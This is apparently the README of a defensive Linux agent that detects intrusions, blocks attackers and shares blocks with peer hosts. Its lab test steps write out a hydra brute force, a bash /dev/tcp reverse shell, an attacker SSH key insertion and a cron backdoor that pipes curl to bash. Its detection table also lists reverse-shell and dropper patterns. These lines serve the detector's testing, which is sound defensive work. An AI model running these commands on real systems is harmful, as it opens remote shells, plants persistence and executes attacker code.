# Swarm Defense

A defensive agent per host, talking to the other agents on the same network. No
controller, no cloud, no agent-side ML: it reads the telemetry Linux already
produces, blocks what it can prove, and tells its peers within a second so the
same attacker is refused everywhere at once.

It is built to be deployed on a machine you own and are allowed to administer.
Everything that mutates the host is behind `mode: enforce`, which refuses to
start unless the process is root.

```
                     ┌──────────── UDP 9911, HMAC-signed ────────────┐
                     │                                               │
  /var/log/auth.log ─┤                                               ├─ host B
  journald sshd/sudo │              ┌──────────────┐                 │  (agent)
  /proc/<pid>/*   ───► node A ───────│   responder  │── iptables/nft ─┘
  /proc/net/tcp     │  (agent)      │ decide → act │── kill / quarantine
  watched settings ─┤               └──────────────┘── SQLite + syslog + JSONL
       ▲            │                     ▲  threat queue
       │            └──── gossip in ───────┘
   swarm.key
```

Three layers, deliberately separated so you can audit each one:

* **Detect** (`secops/detect/`) - rule-based, each rule names the exact log text
  or `/proc` field it matched, so every decision is checkable against the trail.
* **Decide and act** (`secops/respond.py`) - one worker thread, guard rails
  before anything destructive, evidence captured first, undo record after.
* **Share** (`secops/transport.py`, `secops/signature.py`) - a compact signed
  signature: subject, attack, direction, ports, ttl, hop, reason, HMAC. Peers
  verify the format, the key, the clock and the hop limit before applying.

Two operator-facing tools sit beside those layers, and neither is a hop or a
controller: **`swarmconsole`** (`secops/console/`) is a read-only dashboard over
the whole swarm - nodes, attacks, attacker IPs - and **`swarmvalidate`**
(`secops/validation/`) replays each documented attack against a lab and reports
which classes were actually caught. Both are covered below.

---

## What it watches, and what it catches

| Detection | Source | Reaction |
|---|---|---|
| `ssh_bruteforce` | failed-password / MaxAuthTries lines, per source, sliding window | block inbound, permanent after `permanent_after`, teach peers |
| `credential_breach` | an `Accepted` line from a source that had just been failing | block inbound + alert, never auto-forgotten |
| `new_source_login` | first successful login from an unknown source | alert, record the source as approved (TOFU) |
| `priv_esc_attempt` | `sudo: ... 3 incorrect password attempts`, `user NOT in sudoers` | alert, block if paired with a network hit |
| `reverse_shell` | `/dev/tcp/`, `nc -e`, `socat exec:`, `mkfifo`, interpreter socket+dup2, base64 pipe to shell | kill the process and its shell children, block the peer outbound, teach peers |
| `dropper_exec` | curl/wget pipe-to-shell, execution from `/tmp`, `/dev/shm`, `/var/tmp` | kill, quarantine the payload file, block the origin |
| `c2_outbound` | a new outbound socket to an endpoint never seen before, or reconnection to a previously bad one | block outbound, kill if corroborated by a process hit |
| `port_scan` | SYN-RECV burst across 8+ ports in one sample | block inbound |
| `persistence` | change/removal under `authorized_keys`, `sudoers`, `sshd_config`, `ld.so.preload`, cron, systemd units, `.bashrc` | line-level diff, restore the baseline, quarantine the modified copy |

The process grammar is weighted and transparent (`secops/detect/procs.py`):
individual indicators are recorded, but destructive action needs a combined
confidence above `MIN_CONFIDENCE`, lifted by corroboration - an open socket to a
never-seen endpoint, a dropper path, or a shell born under a browser. That is
what catches "employee clicks the scam link" while leaving your own
`python -c` alone.

Socket-to-process attribution is real: the agent reads `/proc/net/tcp{,6}`,
maps the socket inode back through `/proc/<pid>/fd`, and can therefore name the
binary, its cmdline, cwd, uid, SHA-256, lineage to init, and the address it was
talking to before anything is killed.

---

## Deploy

Ubuntu 22.04/24.04, Python 3.11+, stdlib only. Nothing to `pip install`.

```bash
git clone <this repo> && cd secops
sudo ./deploy/install-ubuntu.sh                       # monitor mode
sudo systemctl start swarm-agent
swarmctl status
```

The installer puts the code in `/opt/swarm`, config in `/etc/swarm/agent.json`,
state in `/var/lib/swarm` (0700), the shared key in `/etc/swarm/swarm.key`
(0600), installs `deploy/swarm-agent.service`, and adds `swarmd` / `swarmctl` to
`/usr/local/bin`. Re-running it never overwrites an existing config or key.

### Second host

Both agents must hold the **same** key and know each other's address.

```bash
# on the first host
ssh root@10.0.0.12 'install -d -m 755 /etc/swarm'
scp /etc/swarm/swarm.key root@10.0.0.12:/etc/swarm/swarm.key
ssh root@10.0.0.12 'chmod 600 /etc/swarm/swarm.key'

# on the second host, pointing back at the first
sudo ./deploy/install-ubuntu.sh --peer 10.0.0.11
```

Then add the second host to `/etc/swarm/agent.json` on the first one (and vice
versa, if you installed without `--peer`) and restart both. A `peers` entry is
`{"node": "web-02", "address": "10.0.0.12", "port": 9911}` - the `node` name is
what appears as the rule source in `swarmctl blocks`, so make them readable.
Set `swarm.node.advertise_ip` if a host has several interfaces and picks the wrong
one. Open UDP 9911 between the agents - the gossip is unicast to each configured
peer; `swarm.discovery.enabled: true` switches on multicast self-organisation
(`239.255.77.88`) so a new host needs no peer list.

If you use ufw or another ruleset alongside it, allow the gossip port before
arming the agent, or the swarm silently becomes a set of single hosts:

```bash
sudo ufw allow from 10.0.0.0/24 to any port 9911 proto udp
```

### Arm it

`monitor` (default) detects, logs, gossips and records what it *would* do -
`swarmctl blocks` shows the rules, `status` shows `dry_run: true`. Nothing
touches the kernel, no process is signalled, no file is written back.

```bash
sudo nano /etc/swarm/agent.json      # "mode": "enforce"
sudo systemctl restart swarm-agent
```

Enforce mode writes into dedicated chains it owns - `SWARM` jumped from `INPUT`
and `SWARM-OUT` jumped from `OUTPUT` (or an `inet swarm` nftables table) - and
never edits your existing rules. `swarmctl flush` removes everything it added.

---

## Test it the way you said you would

From an outside box against your deliberately vulnerable Ubuntu host. All three
scenarios below are the real code path, not a simulation - and `swarmvalidate`
will run this whole list for you against a lab (see "Replay it all at once"
below) instead of asking you to type it by hand.

**1. SSH brute force** - watch it block and teach:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 ssh://10.0.0.11
watch -n1 swarmctl blocks           # on the target
swarmctl status | grep gossip       # on the peer: tx/rx/accepted
ssh root@10.0.0.11                  # from the attacker: now refused
swarmctl incidents                  # merged incident, hits, evidence lines
```

The default threshold is 6 failures in 120s; `ssh.permanent_after` (18) escalates
to a day. Set `ssh.failures` to 4 in a lab to see it faster.

**2. Scam link / reverse shell** - from the target, as a normal user, mimicking a
payload a browser opened (this is a test on your own machine; kill it yourself
afterwards if the agent is still in monitor mode):

```bash
nc -lvp 4444 &                      # on the attacker box
bash -c 'exec 3<>/dev/tcp/ATTACKER/4444; sh <&3 >&3 2>&3'
```

Expected on the target: a `reverse_shell` incident with the pid, cmdline, exe
SHA-256 and the peer address; in enforce mode the process is killed and its shell
children with it, the peer gets the signature, and `198.51.100.x` is refused
outbound. Evidence lands in `/var/lib/swarm/evidence/`.

**3. Persistence** - let the shell you caught edit the settings it wants to keep:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2E attacker@vps" >> ~/.ssh/authorized_keys
echo 'curl -s http://ATTACKER/s | bash' > /etc/cron.d/backdoor   # as root
swarmctl integrity                  # shows the drift
swarmctl restore ~/.ssh/authorized_keys   # or let enforce mode do it
```

Expected: a `persistence` threat naming the added lines and the markers matched
(`authorized_key`, `remote_payload`, `pipe_to_shell`), the file written back from
the baseline, the modified copy quarantined rather than deleted.

**Verify the guard rails** (do this before you trust it with a production box):

```bash
swarmctl block 127.0.0.1        # refused: operator allowlist
swarmctl block <peer-address>   # refused: it would break the swarm
swarmctl status                 # guard-denied counter goes up
```

### Replay it all at once

Typing the above by hand is how a defence ends up untested. `swarmvalidate`
replays each documented class against a lab and reports, per class, whether a
node *detected* it, whether the responder *actioned* it, whether a rule was
*blocked* and whether a *peer learned* it:

```bash
deploy/make-lab.sh                       # two monitor agents under .runs/demo
python3 -m secops validate --node .runs/demo/node-a.json --node .runs/demo/node-b.json \
        --lab-root .runs/demo
```

```
│ ssh_bruteforce    │ sshd failed-password burst │ e2e │ 1 │ 1 │ 1 │ 1 │ pass │
│ port_scan         │ half-open sweep, 8 ports   │ detector │ 1 │ 0 │ 0 │ 0 │ pass │
│ exploit_attempt   │ (no scenario)              │ skip │ 0 │ 0 │ 0 │ 0 │ uncovered │
```

* Every row is `e2e` or `detector`. A `detector` row ran the detection function
  over a connection table or command list that was never really there - it is
  labelled `detector-only (not end-to-end)` and never counts as a live catch.
  `port_scan` and a synthetic `c2_outbound` can only be shown that way: real
  `SYN_RECV` rows need kernel changes, and `203.0.113.x` reports as private, so
  the outbound filter drops it before the watcher ever sees it.
* Classes with no scenario print `uncovered` and fail the exit code, so a gap
  cannot be hidden by omission. `exploit_attempt` is one: the vocabulary declares
  it and nothing emits it.
* It refuses to run unless every node is in `monitor` mode with firewall backend
  `none`, and its state directory, control socket **and watched auth log** all sit
  under `--lab-root`. A config that points at `/var/log/auth.log` is refused - the
  scenarios write forged attacker lines into that file.
* Cleanup is part of the test: auth log emptied, decoys terminated, planted keys
  restored, blocks released. `--keep` leaves it all for inspection, `--json` is for CI.

---

## Operating

Control is a Unix socket (`/var/lib/swarm/agent.sock`, mode 0600). There is no
TCP control port, so the agent adds no new network attack surface - the only TCP
socket in this project belongs to `swarmconsole`, on a machine you choose, and
the agents never learn it exists except as a gossip peer you list by hand.

```
swarmctl status | peers | blocks | integrity | endpoints | stats
swarmctl incidents --limit 25 [--state open]     show <id>
swarmctl block <addr> [--ttl 3600] [--direction in|out|both] [--reason ...]
swarmctl unblock <addr> [--direction in|out]     flush
swarmctl rollback [--incident <id>]              undo the reversible actions
swarmctl isolate <addr> / release <addr>         cut a device out of the swarm
swarmctl approve-endpoint <ip:port> / revoke-endpoint <ip:port>
swarmctl approve-path <file> / restore <file>
swarmctl doctor
```

`rollback` uses the undo record stored with each action: unblocks are reversed,
restored files are re-applied, and the incident is marked `rolled_back`.

Every incident is written to `/var/lib/swarm/incidents.db` (SQLite),
`threats.jsonl`, and syslog (tag `swarm-agent`, facility `auth.warning` for
severity 3 and above), so `journalctl -t swarm-agent` works on a headless box:

```bash
sqlite3 /var/lib/swarm/incidents.db \
  "select id,attack,subject,hits,state from incidents order by id desc limit 20;"
```

---

## Watching the whole swarm

`swarmctl` answers questions about one host at a time. `swarmconsole` is a
separate, read-only process that puts the whole swarm on one page: nodes with
mode, backend and gossip counters; attacks with the attacker address, evidence
and severity; IPs aggregated across nodes with remaining TTL; and a posture tab
that reviews this machine's configuration.

```bash
python3 -m secops console --discover /etc/swarm        # http://127.0.0.1:8786/
python3 -m secops console --node .runs/demo/node-a.json --observe-port 19990 --dump
```

It reads the same Unix sockets `swarmctl` uses, so the agents still open no TCP
port - there is a posture check that proves it. What makes it safe to expose to
an operator's browser:

* **Read-only by construction.** Routes map to a fixed set of command names
  (`status`, `incidents`, `blocks`, `peers`, `endpoints`, `integrity`, `stats`)
  chosen in `sources.py`; the wire command never comes from the URL, and
  `flush`/`block`/`isolate` are unreachable even if the console is buggy.
* **Loopback by default.** Serving any other address is refused outright unless
  you pass `--token` (or `SWARM_CONSOLE_TOKEN`); the token is compared in
  constant time, from a header or the query string. `deploy/swarm-console.service`
  runs it as its own unprivileged user with no capabilities.
* **Evidence is attacker-supplied text.** It is rendered with `textContent`
  only, with `default-src 'none'` and no inline script, so a username of
  `<img onerror=...>` arrives as a log line and leaves as inert text. Tests
  assert the absence of every HTML sink.
* **The gossip observer is off by default.** With `--observe-port` the console
  *hears* the signed swarm traffic (list it as a peer in each agent config) and
  records what it validates. It composes the transport with no peers and its
  callback returns false, so it never applies, teaches or re-broadcasts - and
  `sent`/`forwarded` stay at zero, which is what the dashboard prints.

The honest caveats: on loopback a token is optional for convenience, which means
any local user can read the swarm view - pass `--token` if that is not
acceptable. And to verify signatures the console holds the swarm key, so treat
it as a root-equivalent reader: anyone who can read that key can already teach
this swarm anything.

---

## Layout

```
secops/
  agent.py          wiring: watchers -> queue -> responder -> gossip
  config.py         /etc/swarm/agent.json, defaults, validation
  detect/authlog.py sshd/sudo/su parsers (log text named per rule)
  detect/authbrute.py  sliding-window rules, escalation, TOFU logins
  detect/procs.py   exec-time grammar + corroboration + confidence floor
  detect/net.py     outbound endpoints, reconnection to known-bad, scan burst
  detect/integrity.py  baseline/backup/diff/restore/quarantine
  firewall.py       iptables + nftables + dry-run monitor mode
  transport.py      UDP gossip, dedupe, token bucket, hop limit
  signature.py      wire format, structural validation, HMAC
  respond.py        guard rails, kill, block, quarantine, evidence capture
  procfs.py         /proc reads: processes, sockets, inodes, lineage
  audit.py          SQLite + JSONL + syslog
  cli.py            swarmctl
  console/          swarmconsole: model, socket+file sources, receive-only
                    observer, snapshot, HTTP server, posture audit, static UI
  validation/       swarmvalidate: lab gate, scenario registry, scoring, report
  selftest.py       doctor
tests/              75 tests: units, console contract, harness gate, and two
                    live agents over loopback UDP
```

```bash
python3 -m unittest discover -s tests    # units + integration
python3 -m secops doctor                 # grammar, signature, guard-rail self-test
python3 -m secops config-example         # full annotated default config
python3 -m secops console --help         # read-only swarm dashboard
python3 -m secops validate --list        # every attack class it can prove
```

The integration suite runs two real agents with real UDP between them, feeding
`auth.log` lines through the same tailer and parsers a production host uses, with
the firewall in `none` mode so the test machine is never modified.

---

## What this does not do

Stated plainly, because a defence that oversells itself is worse than none.

* **It is signature and behaviour based.** Novel, heavily obfuscated, or pure
  in-memory payloads that never look like a shell can pass unremarked. The
  grammar catches the *shape* of reverse shells, not their intent.
* **UDP gossip assumes a trusted local network.** The shared key authenticates
  content and is replay-resistant within the TTL window, but it is one symmetric
  key: any host that holds it can teach the swarm, and any host that does not is
  silent. Anyone who can read the key file owns the swarm's trust. Rotate it by
  replacing the file on every host and restarting.
* **It cannot stop an attacker who is already root** through a path the agent
  does not watch, and it will not know that a legitimate-looking change is
  illegitimate. Restoring `authorized_keys` is a race you win only if the agent
  was watching before the edit.
* **It can lock you out.** Wrong allowlist, wrong confidence floor, or a NAT that
  makes one source look like many are enough. That is why monitor mode is the
  default, why the allowlist exists, why killing your own `sshd` session needs
  confidence ≥ 0.85, and why `swarmctl flush` is there.
* **Rate limiting and hop limits are crude by design** (`max_new_per_second`,
  TTL, hop count) - enough to stop a signature storm, not a proof against a
  hostile peer inside the swarm.
* **It has no evaluation data.** Detection quality depends on your traffic. Run
  it in monitor mode for a week and read the incidents before you arm it.
* **The console and the validator are not penetration testers.** `swarmvalidate`
  replays the attacks *this codebase claims to catch*, against a lab it refuses to
  let you point at anything real; it says nothing about whether your host is
  vulnerable in general. The posture tab reads configuration - file modes,
  ownership, listeners, allowlists, monitor-versus-enforce drift. A green posture
  tab has never seen an exploit and does not mean the host is safe from one.
* **A class in the vocabulary is not necessarily a class that fires.**
  `exploit_attempt` is declared in `signals.py`, mapped nowhere in the grammar,
  and `swarmvalidate --list` reports it as `uncovered` rather than inventing a
  scenario for it. Treat that as a real gap, not a passing test.
* **`guard.never_kill_uids` is documented, not implemented.** `Guard.may_kill`
  checks comm names, allowlisted peers and session ownership; it never looks at
  the uid list. Configuring it changes nothing today.
